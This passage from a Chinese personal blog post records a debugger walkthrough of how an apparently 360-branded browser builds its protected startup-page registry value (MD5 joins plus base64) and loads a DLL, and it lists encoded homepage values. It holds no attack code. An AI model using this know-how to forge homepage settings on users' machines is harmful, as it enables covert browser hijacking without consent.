<p>找到下面的第四个函数，发现其调用chrome.0x1d2e57d地址，Ctrl+G转到chrome.0x1d2e57d地址，挂断点跑程序。这个函数要找的设置主页的函数。</p>
<h2><span id="chrome0x1d2e57d详细分析">chrome.0x1d2e57d详细分析</span></h2><p>首先打开注册表</p>
<p><img src="/images/360-999.PNG" alt="打开注册表&lt;span
data-label=&quot;360-999&quot;&gt;&lt;/span&gt;"></p>
<p>如图[360-999]可以发现打开注册表并不是homepage键值，而是urls_to_restore_on_startup键值。</p>
<p>接着开始得到MD5-1值，进行了第一次拼接[360-998]</p>
<p><img src="/images/360-998.PNG" alt="得到MD5-1&lt;span
data-label=&quot;360-998&quot;&gt;&lt;/span&gt;"></p>
<p><img src="/images/360-997.PNG" alt="得到MD5-2&lt;span
data-label=&quot;360-997&quot;&gt;&lt;/span&gt;"></p>
<p>接着进行第二次拼接操作[360-996],[360-995]</p>
<p><img src="/images/360-996.PNG" alt="url+MD5-2&lt;span
data-label=&quot;360-996&quot;&gt;&lt;/span&gt;"></p>
<p><img src="/images/360-995.PNG" alt="url+MD5-2&lt;span
data-label=&quot;360-995&quot;&gt;&lt;/span&gt;"></p>
<p>进行base64编码[360-994]</p>
<p><img src="/images/360-994.PNG" alt="&lt;span data-label=&quot;360-994&quot;&gt;&lt;/span&gt;"></p>
<p>最后设置注册表的操作[360-993]</p>
<p><img src="/images/360-993.PNG" alt="最后进行注册表的操作&lt;span
data-label=&quot;360-993&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p>
<p>分析了一圈，可以发现在我的机器上，主要是设置urls_to_restore_on_startup。这个地址其实是我IE的主页url<a href="http://www.msn.com/zh-cn" target="_blank" rel="external">http://www.msn.com/zh-cn</a>。</p>
<h2><span id="一些发现">一些发现</span></h2><p>当然，这期间的分析过程中是碰到诸多的麻烦，当然也会有一些意外的收获。</p>
<h3><span id="解析各种文件">解析各种文件</span></h3><p>这段代码主要在chrome.0x1e516dc chrome.0x1e51b06。</p>
<h3><span id="加载chromedll文件">加载chrome.dll文件</span></h3><p>继续跟踪，发现注释多次提到了chrome.01c50000，数据窗口跟随下，发现是个PE文件，根据其PE文件头中文件属性，可知值是0x2122[]，这样就可以知道是个32位的DLL文件。</p>
<p><img src="/images/360-PE1.PNG" alt="chrome.01c50000 PE头文件属性&lt;span
data-label=&quot;360-PE1&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p>
<p>单步进入0x464390。首先会验证是否是PE文件，检查0x5a4d[360-PE2]。</p>
<p><img src="/images/360-PE2.PNG" alt="chrome.01c50000验证是否为PE文件&lt;span
data-label=&quot;360-PE2&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p>
<p>而在0x001bb530处则存储了DLL路径数据[360-PE3]。</p>
<p><img src="/images/360-PE3.PNG" alt="chrome.01c50000路径信息存储位置&lt;span
data-label=&quot;360-PE3&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p>
<p>当然也会获取关于PE文件内存映像大小[360-PE4]。</p>
<p><img src="/images/360-PE4.PNG" alt="chrome.01c50000PE文件内存映像大小获取&lt;span
data-label=&quot;360-PE4&quot;&gt;&lt;/span&gt;">{width=”80.00000%”}</p>
<h3><span id="注册表的homepage值">注册表的homepage值</span></h3><p>OK，既然可以设置注册表位置，更改主页设置，可以找到这几个homepage值</p>
<pre><code>http://www.msn.com/zh-cn:
aHR0cDovL3d3dy5taWNyb3NvZnQuY29tL2lzYXBpL3JlZGlyLmRsbD9wcmQ9aWUmcHZlcj02JmFyPW1zbmhvbWV7MGY4YWFjZmExMzg3ZTNmYzFmMGI1MDUyNmE2NDk0MDh9ezViZWM0NmQ1YzA0Y2ZlYjVkZjkyYjBiMWU1NGJiMjk0fQ==

e2ZjMzYwMTE1NTJjNjA2ZjBhNDFkOTg0Nzk5YzkyNjVhfXswMTI5Zjg5NjE3N2Q1ZDVjZWI1MmJjMjU3ZmEyZGZkNn0=

https://www.baidu.com/:
aHR0cDovL3d3dy5iYWlkdS5jb20vezIzMmMxN2U1OTI0NTY5ZjA1NzIwYjE5YzI3MGYwNWE1fXtmOTgxZmViY2RiMWNhMzdkNGFiODRiZTViNGUxMmFmYX0=
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="Asan" />
          <p class="site-author-name" itemprop="name">Asan</p>
          <p class="site-description motion-element" itemprop="description">Asanzjx Personal Blog</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">43</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">57</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Asan</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  

    <script type="text/javascript">
      var disqus_shortname = 'asanzjx';
      var disqus_identifier = 'index.html';
      var disqus_title = "";
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  




  
  
  

  

  

</body>
</html>
